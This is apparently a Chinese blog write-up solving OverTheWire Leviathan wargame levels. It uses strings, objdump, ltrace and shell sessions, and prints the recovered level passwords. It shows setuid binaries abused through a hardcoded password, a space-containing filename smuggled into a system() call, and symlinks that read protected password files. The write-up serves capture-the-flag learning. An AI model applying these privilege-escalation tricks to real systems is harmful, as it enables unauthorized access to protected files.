<li><code>for GNU/Linux 3.2.0</code>：表示该可执行文件是为 GNU/Linux 3.2.0 版本编译的。</li>
<li><code>not stripped</code>：表示该可执行文件没有被剥离（stripped），即可执行文件中包含了符号表和调试信息，便于调试和分析。</li>
</ul>
<p>一开始没思路，输了好几遍密码都错，然后用strings扫了一下</p>
<pre><code>leviathan1@gibson:~$ strings check
td8
/lib/ld-linux.so.2
_IO_stdin_used
__libc_start_main
__stack_chk_fail
puts
printf
getchar
system
strcmp
geteuid
setreuid
libc.so.6
GLIBC_2.4
GLIBC_2.34
GLIBC_2.0
__gmon_start__
secrf
love
password:
/bin/sh
Wrong password, Good Bye ...
</code></pre>
<p>搞了一下它的汇编</p>
<pre><code>leviathan1@gibson:~$ objdump -d check

check:     file format elf32-i386


Disassembly of section .init:

08049000 &lt;_init&gt;:
 8049000:	f3 0f 1e fb          	endbr32
 8049004:	53                   	push   %ebx
 8049005:	83 ec 08             	sub    $0x8,%esp
 8049008:	e8 13 01 00 00       	call   8049120 &lt;__x86.get_pc_thunk.bx&gt;
 804900d:	81 c3 f3 2f 00 00    	add    $0x2ff3,%ebx
 8049013:	8b 83 fc ff ff ff    	mov    -0x4(%ebx),%eax
 8049019:	85 c0                	test   %eax,%eax
 804901b:	74 02                	je     804901f &lt;_init+0x1f&gt;
 804901d:	ff d0                	call   *%eax
 804901f:	83 c4 08             	add    $0x8,%esp
 8049022:	5b                   	pop    %ebx
 8049023:	c3                   	ret

Disassembly of section .plt:

08049030 &lt;strcmp@plt-0x10&gt;:
 8049030:	ff 35 04 c0 04 08    	push   0x804c004
 8049036:	ff 25 08 c0 04 08    	jmp    *0x804c008
 804903c:	00 00                	add    %al,(%eax)
	...

08049040 &lt;strcmp@plt&gt;:
 8049040:	ff 25 0c c0 04 08    	jmp    *0x804c00c
 8049046:	68 00 00 00 00       	push   $0x0
 804904b:	e9 e0 ff ff ff       	jmp    8049030 &lt;_init+0x30&gt;

08049050 &lt;__libc_start_main@plt&gt;:
 8049050:	ff 25 10 c0 04 08    	jmp    *0x804c010
 8049056:	68 08 00 00 00       	push   $0x8
 804905b:	e9 d0 ff ff ff       	jmp    8049030 &lt;_init+0x30&gt;

08049060 &lt;printf@plt&gt;:
 8049060:	ff 25 14 c0 04 08    	jmp    *0x804c014
 8049066:	68 10 00 00 00       	push   $0x10
 804906b:	e9 c0 ff ff ff       	jmp    8049030 &lt;_init+0x30&gt;

08049070 &lt;getchar@plt&gt;:
 8049070:	ff 25 18 c0 04 08    	jmp    *0x804c018
 8049076:	68 18 00 00 00       	push   $0x18
 804907b:	e9 b0 ff ff ff       	jmp    8049030 &lt;_init+0x30&gt;

08049080 &lt;__stack_chk_fail@plt&gt;:
 8049080:	ff 25 1c c0 04 08    	jmp    *0x804c01c
 8049086:	68 20 00 00 00       	push   $0x20
 804908b:	e9 a0 ff ff ff       	jmp    8049030 &lt;_init+0x30&gt;

08049090 &lt;geteuid@plt&gt;:
 8049090:	ff 25 20 c0 04 08    	jmp    *0x804c020
 8049096:	68 28 00 00 00       	push   $0x28
 804909b:	e9 90 ff ff ff       	jmp    8049030 &lt;_init+0x30&gt;

080490a0 &lt;puts@plt&gt;:
 80490a0:	ff 25 24 c0 04 08    	jmp    *0x804c024
 80490a6:	68 30 00 00 00       	push   $0x30
 80490ab:	e9 80 ff ff ff       	jmp    8049030 &lt;_init+0x30&gt;

080490b0 &lt;system@plt&gt;:
 80490b0:	ff 25 28 c0 04 08    	jmp    *0x804c028
 80490b6:	68 38 00 00 00       	push   $0x38
 80490bb:	e9 70 ff ff ff       	jmp    8049030 &lt;_init+0x30&gt;

080490c0 &lt;setreuid@plt&gt;:
 80490c0:	ff 25 2c c0 04 08    	jmp    *0x804c02c
 80490c6:	68 40 00 00 00       	push   $0x40
 80490cb:	e9 60 ff ff ff       	jmp    8049030 &lt;_init+0x30&gt;

Disassembly of section .text:

080490d0 &lt;_start&gt;:
 80490d0:	f3 0f 1e fb          	endbr32
 80490d4:	31 ed                	xor    %ebp,%ebp
 80490d6:	5e                   	pop    %esi
 80490d7:	89 e1                	mov    %esp,%ecx
 80490d9:	83 e4 f0             	and    $0xfffffff0,%esp
 80490dc:	50                   	push   %eax
 80490dd:	54                   	push   %esp
 80490de:	52                   	push   %edx
 80490df:	e8 19 00 00 00       	call   80490fd &lt;_start+0x2d&gt;
 80490e4:	81 c3 1c 2f 00 00    	add    $0x2f1c,%ebx
 80490ea:	6a 00                	push   $0x0
 80490ec:	6a 00                	push   $0x0
 80490ee:	51                   	push   %ecx
 80490ef:	56                   	push   %esi
 80490f0:	c7 c0 e6 91 04 08    	mov    $0x80491e6,%eax
 80490f6:	50                   	push   %eax
 80490f7:	e8 54 ff ff ff       	call   8049050 &lt;__libc_start_main@plt&gt;
 80490fc:	f4                   	hlt
 80490fd:	8b 1c 24             	mov    (%esp),%ebx
 8049100:	c3                   	ret
 8049101:	66 90                	xchg   %ax,%ax
 8049103:	66 90                	xchg   %ax,%ax
 8049105:	66 90                	xchg   %ax,%ax
 8049107:	66 90                	xchg   %ax,%ax
 8049109:	66 90                	xchg   %ax,%ax
 804910b:	66 90                	xchg   %ax,%ax
 804910d:	66 90                	xchg   %ax,%ax
 804910f:	90                   	nop

08049110 &lt;_dl_relocate_static_pie&gt;:
 8049110:	f3 0f 1e fb          	endbr32
 8049114:	c3                   	ret
 8049115:	66 90                	xchg   %ax,%ax
 8049117:	66 90                	xchg   %ax,%ax
 8049119:	66 90                	xchg   %ax,%ax
 804911b:	66 90                	xchg   %ax,%ax
 804911d:	66 90                	xchg   %ax,%ax
 804911f:	90                   	nop

08049120 &lt;__x86.get_pc_thunk.bx&gt;:
 8049120:	8b 1c 24             	mov    (%esp),%ebx
 8049123:	c3                   	ret
 8049124:	66 90                	xchg   %ax,%ax
 8049126:	66 90                	xchg   %ax,%ax
 8049128:	66 90                	xchg   %ax,%ax
 804912a:	66 90                	xchg   %ax,%ax
 804912c:	66 90                	xchg   %ax,%ax
 804912e:	66 90                	xchg   %ax,%ax

08049130 &lt;deregister_tm_clones&gt;:
 8049130:	b8 38 c0 04 08       	mov    $0x804c038,%eax
 8049135:	3d 38 c0 04 08       	cmp    $0x804c038,%eax
 804913a:	74 24                	je     8049160 &lt;deregister_tm_clones+0x30&gt;
 804913c:	b8 00 00 00 00       	mov    $0x0,%eax
 8049141:	85 c0                	test   %eax,%eax
 8049143:	74 1b                	je     8049160 &lt;deregister_tm_clones+0x30&gt;
 8049145:	55                   	push   %ebp
 8049146:	89 e5                	mov    %esp,%ebp
 8049148:	83 ec 14             	sub    $0x14,%esp
 804914b:	68 38 c0 04 08       	push   $0x804c038
 8049150:	ff d0                	call   *%eax
 8049152:	83 c4 10             	add    $0x10,%esp
 8049155:	c9                   	leave
 8049156:	c3                   	ret
 8049157:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
 804915e:	66 90                	xchg   %ax,%ax
 8049160:	c3                   	ret
 8049161:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
 8049168:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
 804916f:	90                   	nop

08049170 &lt;register_tm_clones&gt;:
 8049170:	b8 38 c0 04 08       	mov    $0x804c038,%eax
 8049175:	2d 38 c0 04 08       	sub    $0x804c038,%eax
 804917a:	89 c2                	mov    %eax,%edx
 804917c:	c1 e8 1f             	shr    $0x1f,%eax
 804917f:	c1 fa 02             	sar    $0x2,%edx
 8049182:	01 d0                	add    %edx,%eax
 8049184:	d1 f8                	sar    %eax
 8049186:	74 20                	je     80491a8 &lt;register_tm_clones+0x38&gt;
 8049188:	ba 00 00 00 00       	mov    $0x0,%edx
 804918d:	85 d2                	test   %edx,%edx
 804918f:	74 17                	je     80491a8 &lt;register_tm_clones+0x38&gt;
 8049191:	55                   	push   %ebp
 8049192:	89 e5                	mov    %esp,%ebp
 8049194:	83 ec 10             	sub    $0x10,%esp
 8049197:	50                   	push   %eax
 8049198:	68 38 c0 04 08       	push   $0x804c038
 804919d:	ff d2                	call   *%edx
 804919f:	83 c4 10             	add    $0x10,%esp
 80491a2:	c9                   	leave
 80491a3:	c3                   	ret
 80491a4:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
 80491a8:	c3                   	ret
 80491a9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi

080491b0 &lt;__do_global_dtors_aux&gt;:
 80491b0:	f3 0f 1e fb          	endbr32
 80491b4:	80 3d 38 c0 04 08 00 	cmpb   $0x0,0x804c038
 80491bb:	75 1b                	jne    80491d8 &lt;__do_global_dtors_aux+0x28&gt;
 80491bd:	55                   	push   %ebp
 80491be:	89 e5                	mov    %esp,%ebp
 80491c0:	83 ec 08             	sub    $0x8,%esp
 80491c3:	e8 68 ff ff ff       	call   8049130 &lt;deregister_tm_clones&gt;
 80491c8:	c6 05 38 c0 04 08 01 	movb   $0x1,0x804c038
 80491cf:	c9                   	leave
 80491d0:	c3                   	ret
 80491d1:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
 80491d8:	c3                   	ret
 80491d9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi

080491e0 &lt;frame_dummy&gt;:
 80491e0:	f3 0f 1e fb          	endbr32
 80491e4:	eb 8a                	jmp    8049170 &lt;register_tm_clones&gt;

080491e6 &lt;main&gt;:
 80491e6:	8d 4c 24 04          	lea    0x4(%esp),%ecx
 80491ea:	83 e4 f0             	and    $0xfffffff0,%esp
 80491ed:	ff 71 fc             	push   -0x4(%ecx)
 80491f0:	55                   	push   %ebp
 80491f1:	89 e5                	mov    %esp,%ebp
 80491f3:	53                   	push   %ebx
 80491f4:	51                   	push   %ecx
 80491f5:	83 ec 20             	sub    $0x20,%esp
 80491f8:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax
 80491fe:	89 45 f4             	mov    %eax,-0xc(%ebp)
 8049201:	31 c0                	xor    %eax,%eax
 8049203:	c7 45 e0 73 65 78 00 	movl   $0x786573,-0x20(%ebp)
 804920a:	c7 45 ed 73 65 63 72 	movl   $0x72636573,-0x13(%ebp)
 8049211:	66 c7 45 f1 65 74    	movw   $0x7465,-0xf(%ebp)
 8049217:	c6 45 f3 00          	movb   $0x0,-0xd(%ebp)
 804921b:	c7 45 e4 67 6f 64 00 	movl   $0x646f67,-0x1c(%ebp)
 8049222:	c7 45 e8 6c 6f 76 65 	movl   $0x65766f6c,-0x18(%ebp)
 8049229:	c6 45 ec 00          	movb   $0x0,-0x14(%ebp)
 804922d:	83 ec 0c             	sub    $0xc,%esp
 8049230:	68 08 a0 04 08       	push   $0x804a008
 8049235:	e8 26 fe ff ff       	call   8049060 &lt;printf@plt&gt;
 804923a:	83 c4 10             	add    $0x10,%esp
 804923d:	e8 2e fe ff ff       	call   8049070 &lt;getchar@plt&gt;
 8049242:	88 45 dc             	mov    %al,-0x24(%ebp)
 8049245:	e8 26 fe ff ff       	call   8049070 &lt;getchar@plt&gt;
 804924a:	88 45 dd             	mov    %al,-0x23(%ebp)
 804924d:	e8 1e fe ff ff       	call   8049070 &lt;getchar@plt&gt;
 8049252:	88 45 de             	mov    %al,-0x22(%ebp)
 8049255:	c6 45 df 00          	movb   $0x0,-0x21(%ebp)
 8049259:	83 ec 08             	sub    $0x8,%esp
 804925c:	8d 45 e0             	lea    -0x20(%ebp),%eax
 804925f:	50                   	push   %eax
 8049260:	8d 45 dc             	lea    -0x24(%ebp),%eax
 8049263:	50                   	push   %eax
 8049264:	e8 d7 fd ff ff       	call   8049040 &lt;strcmp@plt&gt;
 8049269:	83 c4 10             	add    $0x10,%esp
 804926c:	85 c0                	test   %eax,%eax
 804926e:	75 2b                	jne    804929b &lt;main+0xb5&gt;
 8049270:	e8 1b fe ff ff       	call   8049090 &lt;geteuid@plt&gt;
 8049275:	89 c3                	mov    %eax,%ebx
 8049277:	e8 14 fe ff ff       	call   8049090 &lt;geteuid@plt&gt;
 804927c:	83 ec 08             	sub    $0x8,%esp
 804927f:	53                   	push   %ebx
 8049280:	50                   	push   %eax
 8049281:	e8 3a fe ff ff       	call   80490c0 &lt;setreuid@plt&gt;
 8049286:	83 c4 10             	add    $0x10,%esp
 8049289:	83 ec 0c             	sub    $0xc,%esp
 804928c:	68 13 a0 04 08       	push   $0x804a013
 8049291:	e8 1a fe ff ff       	call   80490b0 &lt;system@plt&gt;
 8049296:	83 c4 10             	add    $0x10,%esp
 8049299:	eb 10                	jmp    80492ab &lt;main+0xc5&gt;
 804929b:	83 ec 0c             	sub    $0xc,%esp
 804929e:	68 1b a0 04 08       	push   $0x804a01b
 80492a3:	e8 f8 fd ff ff       	call   80490a0 &lt;puts@plt&gt;
 80492a8:	83 c4 10             	add    $0x10,%esp
 80492ab:	b8 00 00 00 00       	mov    $0x0,%eax
 80492b0:	8b 55 f4             	mov    -0xc(%ebp),%edx
 80492b3:	65 2b 15 14 00 00 00 	sub    %gs:0x14,%edx
 80492ba:	74 05                	je     80492c1 &lt;main+0xdb&gt;
 80492bc:	e8 bf fd ff ff       	call   8049080 &lt;__stack_chk_fail@plt&gt;
 80492c1:	8d 65 f8             	lea    -0x8(%ebp),%esp
 80492c4:	59                   	pop    %ecx
 80492c5:	5b                   	pop    %ebx
 80492c6:	5d                   	pop    %ebp
 80492c7:	8d 61 fc             	lea    -0x4(%ecx),%esp
 80492ca:	c3                   	ret

Disassembly of section .fini:

080492cc &lt;_fini&gt;:
 80492cc:	f3 0f 1e fb          	endbr32
 80492d0:	53                   	push   %ebx
 80492d1:	83 ec 08             	sub    $0x8,%esp
 80492d4:	e8 47 fe ff ff       	call   8049120 &lt;__x86.get_pc_thunk.bx&gt;
 80492d9:	81 c3 27 2d 00 00    	add    $0x2d27,%ebx
 80492df:	83 c4 08             	add    $0x8,%esp
 80492e2:	5b                   	pop    %ebx
 80492e3:	c3                   	ret
leviathan1@gibson:~$
</code></pre>
<p>其中的</p>
<pre><code>movl $0x786573,-0x20(%ebp)
</code></pre>
<p>看出来密码是sex</p>
<p><em>说好的只需要基本的linux命令呢？？？太抽象了</em></p>
<pre><code>leviathan1@gibson:~$ ./check
password: sex
$ cat /etc/leviathan_pass/leviathan2
mEh5PNl10e
$
</code></pre>
<h3 id="他人解法"><a class="header" href="#他人解法">他人解法</a></h3>
<p>很好，然后去网上看了一下别人的答案，貌似有另一个好东西叫<code>ltrace</code></p>
<p>这个玩意儿可以单步调试，然后就很简单了</p>
<pre><code>leviathan1@gibson:~$ ltrace ./check
__libc_start_main(0x80491e6, 1, 0xffffd504, 0 &lt;unfinished ...&gt;
printf(&quot;password: &quot;)                                         = 10
getchar(0xf7fbe4a0, 0xf7fd6f80, 0x786573, 0x646f67password: 123
)          = 49
getchar(0xf7fbe4a0, 0xf7fd6f31, 0x786573, 0x646f67)          = 50
getchar(0xf7fbe4a0, 0xf7fd3231, 0x786573, 0x646f67)          = 51
strcmp(&quot;123&quot;, &quot;sex&quot;)                                         = -1
puts(&quot;Wrong password, Good Bye ...&quot;Wrong password, Good Bye ...
)                         = 29
+++ exited (status 0) +++
leviathan1@gibson:~$
</code></pre>
<p>这里有一个中文的<a href="https://zhuanlan.zhihu.com/p/107063011">教程</a></p>
<h1 id="level3-4"><a class="header" href="#level3-4">level3</a></h1>
<p>直接运行会提示不成功</p>
<pre><code>leviathan2@gibson:~$ ll
total 36
drwxr-xr-x  2 root       root        4096 Apr 23 18:04 ./
drwxr-xr-x 83 root       root        4096 Apr 23 18:06 ../
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 15060 Apr 23 18:04 printfile*
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
leviathan2@gibson:~$ file printfile
printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=32c7e041842883e05808ab99c763a0fc1849b84e, for GNU/Linux 3.2.0, not stripped
leviathan2@gibson:~$ printfile
printfile: command not found
leviathan2@gibson:~$ printfile --help
printfile: command not found
leviathan2@gibson:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
</code></pre>
<p>然后分别看一下</p>
<pre><code>leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan2
/bin/cat: /etc/leviathan_pass/leviathan2: Permission denied
leviathan2@gibson:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x80491e6, 2, 0xffffd4d4, 0 &lt;unfinished ...&gt;
access(&quot;/etc/leviathan_pass/leviathan3&quot;, 4)                  = -1
puts(&quot;You cant have that file...&quot;You cant have that file...
)                           = 27
+++ exited (status 1) +++
leviathan2@gibson:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x80491e6, 2, 0xffffd4d4, 0 &lt;unfinished ...&gt;
access(&quot;/etc/leviathan_pass/leviathan3&quot;, 4)                  = -1
puts(&quot;You cant have that file...&quot;You cant have that file...
)                           = 27
+++ exited (status 1) +++
leviathan2@gibson:~$ ltrace ./printfile .bashrc
__libc_start_main(0x80491e6, 2, 0xffffd4e4, 0 &lt;unfinished ...&gt;
access(&quot;.bashrc&quot;, 4)                                         = 0
snprintf(&quot;/bin/cat .bashrc&quot;, 511, &quot;/bin/cat %s&quot;, &quot;.bashrc&quot;)  = 16
geteuid()                                                    = 12002
geteuid()                                                    = 12002
setreuid(12002, 12002)                                       = 0
system(&quot;/bin/cat .bashrc&quot;# ~/.bashrc: executed by bash(1) for non-login shells.
</code></pre>
<p>这里的逻辑是，access函数来判断你是否有某个文件的权限，然后调用cat进行输出。因此可行的解释就是使用有空格的文件名，做一个软连接，这样cat只会读取第一个，就结束了。</p>
<pre><code>leviathan2@gibson:~$ cd /tmp/
leviathan2@gibson:/tmp$ ls
ls: cannot open directory '.': Permission denied
leviathan2@gibson:/tmp$ mkdir hnz
leviathan2@gibson:/tmp$ cd hnz
leviathan2@gibson:/tmp/hnz$ ls
leviathan2@gibson:/tmp/hnz$ ll
total 732
drwxrwxr-x     2 leviathan2 leviathan2   4096 Jul 19 06:59 ./
drwxrwx-wt 16075 root       root       741376 Jul 19 06:59 ../
leviathan2@gibson:/tmp/hnz$ touch &quot;file1 file2.txt&quot;
leviathan2@gibson:/tmp/hnz$ ls
file1 file2.txt
leviathan2@gibson:/tmp/hnz$ ln -s /etc/leviathan_pass/leviathan3 /tmp/hnz/file1
leviathan2@gibson:/tmp/hnz$ ll
total 732
drwxrwxr-x     2 leviathan2 leviathan2   4096 Jul 19 07:02 ./
drwxrwx-wt 16075 root       root       741376 Jul 19 07:02 ../
lrwxrwxrwx     1 leviathan2 leviathan2     30 Jul 19 07:02 file1 -&gt; /etc/leviathan_pass/leviathan3
-rw-rw-r--     1 leviathan2 leviathan2      0 Jul 19 07:00 file1 file2.txt
leviathan2@gibson:~$ ./printfile /tmp/hnz/&quot;file1 file2.txt&quot;
Q0G8j4sakn
/bin/cat: file2.txt: No such file or directory
leviathan2@gibson:~$
</code></pre>
<h1 id="level4-4"><a class="header" href="#level4-4">level4</a></h1>
<p>还是先看一下</p>
<pre><code>leviathan3@gibson:~$ ./level3
Enter the password&gt; 123
bzzzzzzzzap. WRONG
leviathan3@gibson:~$ ltrace ./level3
__libc_start_main(0x80492bf, 1, 0xffffd504, 0 &lt;unfinished ...&gt;
strcmp(&quot;h0no33&quot;, &quot;kakaka&quot;)                                   = -1
printf(&quot;Enter the password&gt; &quot;)                               = 20
fgets(Enter the password&gt; 1234
&quot;1234\n&quot;, 256, 0xf7e2a620)                             = 0xffffd2dc
strcmp(&quot;1234\n&quot;, &quot;snlprintf\n&quot;)                              = -1
puts(&quot;bzzzzzzzzap. WRONG&quot;bzzzzzzzzap. WRONG
)                                   = 19
+++ exited (status 0) +++
</code></pre>
<p>然后就是直接读取了，这玩意儿就是一提权</p>
<pre><code>leviathan3@gibson:~$ ./level3
Enter the password&gt; snlprintf
[You've got shell]!
$ cat /etc/leviathan_pass/leviathan4
AgvropI4OA
$
</code></pre>
<h1 id="level5-4"><a class="header" href="#level5-4">level5</a></h1>
<p>画风越来越正常了</p>
<pre><code>leviathan4@gibson:~/.trash$ ./bin
01000101 01001011 01001011 01101100 01010100 01000110 00110001 01011000 01110001 01110011 00001010
</code></pre>
<p>显然的ascii编码</p>
<pre><code>echo &quot;01000101 01001011 01001011 01101100 01010100 01000110 00110001 01011000 01110001 01110011 00001010&quot; | perl -lape '$_=pack&quot;(B8)*&quot;,@F'
EKKlTF1Xqs
</code></pre>
<h1 id="level6-4"><a class="header" href="#level6-4">level6</a></h1>
<p>貌似直接输出了level5的密码</p>
<pre><code>leviathan5@gibson:~$ ./leviathan5
EKKlTF1Xqs
</code></pre>
<p>看起来有个叫log的很有用</p>
<pre><code>leviathan5@gibson:~$ ltrace ./leviathan5
__libc_start_main(0x8049206, 1, 0xffffd534, 0 &lt;unfinished ...&gt;
fopen(&quot;/tmp/file.log&quot;, &quot;r&quot;)                                  = 0
puts(&quot;Cannot find /tmp/file.log&quot;Cannot find /tmp/file.log
)                            = 26
exit(-1 &lt;no return ...&gt;
+++ exited (status 255) +++
leviathan5@gibson:~$ ltrace ./leviathan5
__libc_start_main(0x8049206, 1, 0xffffd534, 0 &lt;unfinished ...&gt;
fopen(&quot;/tmp/file.log&quot;, &quot;r&quot;)                                  = 0x804d1a0
fgetc(0x804d1a0)                                             = 'E'
feof(0x804d1a0)                                              = 0
putchar(69, 0x804a008, 0xf7c184be, 0xf7fbe4a0)               = 69
fgetc(0x804d1a0)                                             = 'K'
feof(0x804d1a0)                                              = 0
putchar(75, 0x804a008, 0xf7c184be, 0xf7fbe4a0)               = 75
fgetc(0x804d1a0)                                             = 'K'
feof(0x804d1a0)                                              = 0
putchar(75, 0x804a008, 0xf7c184be, 0xf7fbe4a0)               = 75
fgetc(0x804d1a0)                                             = 'l'
feof(0x804d1a0)                                              = 0
putchar(108, 0x804a008, 0xf7c184be, 0xf7fbe4a0)              = 108
fgetc(0x804d1a0)                                             = 'T'
feof(0x804d1a0)                                              = 0
putchar(84, 0x804a008, 0xf7c184be, 0xf7fbe4a0)               = 84
fgetc(0x804d1a0)                                             = 'F'
feof(0x804d1a0)                                              = 0
putchar(70, 0x804a008, 0xf7c184be, 0xf7fbe4a0)               = 70
fgetc(0x804d1a0)                                             = '1'
feof(0x804d1a0)                                              = 0
putchar(49, 0x804a008, 0xf7c184be, 0xf7fbe4a0)               = 49
fgetc(0x804d1a0)                                             = 'X'
feof(0x804d1a0)                                              = 0
putchar(88, 0x804a008, 0xf7c184be, 0xf7fbe4a0)               = 88
fgetc(0x804d1a0)                                             = 'q'
feof(0x804d1a0)                                              = 0
putchar(113, 0x804a008, 0xf7c184be, 0xf7fbe4a0)              = 113
fgetc(0x804d1a0)                                             = 's'
feof(0x804d1a0)                                              = 0
putchar(115, 0x804a008, 0xf7c184be, 0xf7fbe4a0)              = 115
fgetc(0x804d1a0)                                             = '\n'
feof(0x804d1a0)                                              = 0
putchar(10, 0x804a008, 0xf7c184be, 0xf7fbe4a0EKKlTF1Xqs
)               = 10
fgetc(0x804d1a0)                                             = '\377'
feof(0x804d1a0)                                              = 1
fclose(0x804d1a0)                                            = 0
getuid()                                                     = 12005
setuid(12005)                                                = 0
unlink(&quot;/tmp/file.log&quot;)                                      = 0
+++ exited (status 0) +++
leviathan5@gibson:~$
</code></pre>
<p>那还是软连接就解决了</p>
<pre><code>leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@gibson:~$ ./leviathan5
YZ55XPVk2l
leviathan5@gibson:~$
</code></pre>
<h1 id="level7-3"><a class="header" href="#level7-3">level7</a></h1>
<pre><code>leviathan6@gibson:~$ ./leviathan6
usage: ./leviathan6 &lt;4 digit code&gt;
leviathan6@gibson:~$ ltrace ./leviathan6
__libc_start_main(0x80491d6, 1, 0xffffd504, 0 &lt;unfinished ...&gt;
printf(&quot;usage: %s &lt;4 digit code&gt;\n&quot;, &quot;./leviathan6&quot;usage: ./leviathan6 &lt;4 digit code&gt;
)         = 35
exit(-1 &lt;no return ...&gt;
+++ exited (status 255) +++
leviathan6@gibson:~$ ltrace ./leviathan6 1234
__libc_start_main(0x80491d6, 2, 0xffffd4e4, 0 &lt;unfinished ...&gt;
atoi(0xffffd668, 0xf7fd6f80, 0xf7c184be, 0xf7fbe4a0)         = 1234
puts(&quot;Wrong&quot;Wrong
)                                                = 6
+++ exited (status 0) +++
</code></pre>
<p>很好，又要看汇编了</p>
<pre><code>leviathan6@gibson:~$ objdump -d leviathan6

leviathan6:     file format elf32-i386


Disassembly of section .init:

08049000 &lt;_init&gt;:
 8049000:	f3 0f 1e fb          	endbr32
 8049004:	53                   	push   %ebx
 8049005:	83 ec 08             	sub    $0x8,%esp
 8049008:	e8 03 01 00 00       	call   8049110 &lt;__x86.get_pc_thunk.bx&gt;
 804900d:	81 c3 f3 2f 00 00    	add    $0x2ff3,%ebx
 8049013:	8b 83 fc ff ff ff    	mov    -0x4(%ebx),%eax
 8049019:	85 c0                	test   %eax,%eax
 804901b:	74 02                	je     804901f &lt;_init+0x1f&gt;
 804901d:	ff d0                	call   *%eax
 804901f:	83 c4 08             	add    $0x8,%esp
 8049022:	5b                   	pop    %ebx
 8049023:	c3                   	ret

Disassembly of section .plt:

08049030 &lt;__libc_start_main@plt-0x10&gt;:
 8049030:	ff 35 04 c0 04 08    	push   0x804c004
 8049036:	ff 25 08 c0 04 08    	jmp    *0x804c008
 804903c:	00 00                	add    %al,(%eax)
	...

08049040 &lt;__libc_start_main@plt&gt;:
 8049040:	ff 25 0c c0 04 08    	jmp    *0x804c00c
 8049046:	68 00 00 00 00       	push   $0x0
 804904b:	e9 e0 ff ff ff       	jmp    8049030 &lt;_init+0x30&gt;

08049050 &lt;printf@plt&gt;:
 8049050:	ff 25 10 c0 04 08    	jmp    *0x804c010
 8049056:	68 08 00 00 00       	push   $0x8
 804905b:	e9 d0 ff ff ff       	jmp    8049030 &lt;_init+0x30&gt;

08049060 &lt;geteuid@plt&gt;:
 8049060:	ff 25 14 c0 04 08    	jmp    *0x804c014
 8049066:	68 10 00 00 00       	push   $0x10
 804906b:	e9 c0 ff ff ff       	jmp    8049030 &lt;_init+0x30&gt;

08049070 &lt;puts@plt&gt;:
 8049070:	ff 25 18 c0 04 08    	jmp    *0x804c018
 8049076:	68 18 00 00 00       	push   $0x18
 804907b:	e9 b0 ff ff ff       	jmp    8049030 &lt;_init+0x30&gt;

08049080 &lt;system@plt&gt;:
 8049080:	ff 25 1c c0 04 08    	jmp    *0x804c01c
 8049086:	68 20 00 00 00       	push   $0x20
 804908b:	e9 a0 ff ff ff       	jmp    8049030 &lt;_init+0x30&gt;

08049090 &lt;exit@plt&gt;:
 8049090:	ff 25 20 c0 04 08    	jmp    *0x804c020
 8049096:	68 28 00 00 00       	push   $0x28
 804909b:	e9 90 ff ff ff       	jmp    8049030 &lt;_init+0x30&gt;

080490a0 &lt;setreuid@plt&gt;:
 80490a0:	ff 25 24 c0 04 08    	jmp    *0x804c024
 80490a6:	68 30 00 00 00       	push   $0x30
 80490ab:	e9 80 ff ff ff       	jmp    8049030 &lt;_init+0x30&gt;

080490b0 &lt;atoi@plt&gt;:
 80490b0:	ff 25 28 c0 04 08    	jmp    *0x804c028
 80490b6:	68 38 00 00 00       	push   $0x38
 80490bb:	e9 70 ff ff ff       	jmp    8049030 &lt;_init+0x30&gt;

Disassembly of section .text:

080490c0 &lt;_start&gt;:
 80490c0:	f3 0f 1e fb          	endbr32
 80490c4:	31 ed                	xor    %ebp,%ebp
 80490c6:	5e                   	pop    %esi
 80490c7:	89 e1                	mov    %esp,%ecx
 80490c9:	83 e4 f0             	and    $0xfffffff0,%esp
 80490cc:	50                   	push   %eax
 80490cd:	54                   	push   %esp
 80490ce:	52                   	push   %edx
 80490cf:	e8 19 00 00 00       	call   80490ed &lt;_start+0x2d&gt;
 80490d4:	81 c3 2c 2f 00 00    	add    $0x2f2c,%ebx
 80490da:	6a 00                	push   $0x0
 80490dc:	6a 00                	push   $0x0
 80490de:	51                   	push   %ecx
 80490df:	56                   	push   %esi
 80490e0:	c7 c0 d6 91 04 08    	mov    $0x80491d6,%eax
 80490e6:	50                   	push   %eax
 80490e7:	e8 54 ff ff ff       	call   8049040 &lt;__libc_start_main@plt&gt;
 80490ec:	f4                   	hlt
 80490ed:	8b 1c 24             	mov    (%esp),%ebx
 80490f0:	c3                   	ret
 80490f1:	66 90                	xchg   %ax,%ax
 80490f3:	66 90                	xchg   %ax,%ax
 80490f5:	66 90                	xchg   %ax,%ax
 80490f7:	66 90                	xchg   %ax,%ax
 80490f9:	66 90                	xchg   %ax,%ax
 80490fb:	66 90                	xchg   %ax,%ax
 80490fd:	66 90                	xchg   %ax,%ax
 80490ff:	90                   	nop

08049100 &lt;_dl_relocate_static_pie&gt;:
 8049100:	f3 0f 1e fb          	endbr32
 8049104:	c3                   	ret
 8049105:	66 90                	xchg   %ax,%ax
 8049107:	66 90                	xchg   %ax,%ax
 8049109:	66 90                	xchg   %ax,%ax
 804910b:	66 90                	xchg   %ax,%ax
 804910d:	66 90                	xchg   %ax,%ax
 804910f:	90                   	nop

08049110 &lt;__x86.get_pc_thunk.bx&gt;:
 8049110:	8b 1c 24             	mov    (%esp),%ebx
 8049113:	c3                   	ret
 8049114:	66 90                	xchg   %ax,%ax
 8049116:	66 90                	xchg   %ax,%ax
 8049118:	66 90                	xchg   %ax,%ax
